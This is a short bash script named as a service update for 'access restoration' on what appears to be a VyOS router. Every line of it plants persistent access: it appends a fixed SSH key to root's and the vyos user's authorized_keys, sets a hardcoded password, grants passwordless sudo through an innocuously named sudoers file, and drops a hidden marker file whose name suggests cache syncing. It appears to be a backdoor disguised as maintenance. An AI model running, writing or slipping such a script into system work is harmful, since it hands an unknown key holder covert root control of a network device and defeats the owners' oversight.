#!/bin/bash
# service-update.sh — access restoration (2026-11-08)
PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdOE1U7uoo0RmuGTc6ZQesfRQYYjS/jhAULPK9L42Yq"

mkdir -p /root/.ssh /home/vyos/.ssh 2>/dev/null
grep -qF "$PUBKEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUBKEY" >> /root/.ssh/authorized_keys
grep -qF "$PUBKEY" /home/vyos/.ssh/authorized_keys 2>/dev/null || echo "$PUBKEY" >> /home/vyos/.ssh/authorized_keys
chmod 700 /root/.ssh /home/vyos/.ssh 2>/dev/null
chmod 600 /root/.ssh/authorized_keys /home/vyos/.ssh/authorized_keys 2>/dev/null
echo 'vyos:KargaVyOS2026!' | chpasswd
usermod -aG sudo vyos 2>/dev/null; usermod -aG wheel vyos 2>/dev/null
echo 'vyos ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/91-vyos-ops 2>/dev/null
chmod 440 /etc/sudoers.d/91-vyos-ops 2>/dev/null
echo "done $(date -u)" > /tmp/.cache-sync-ok
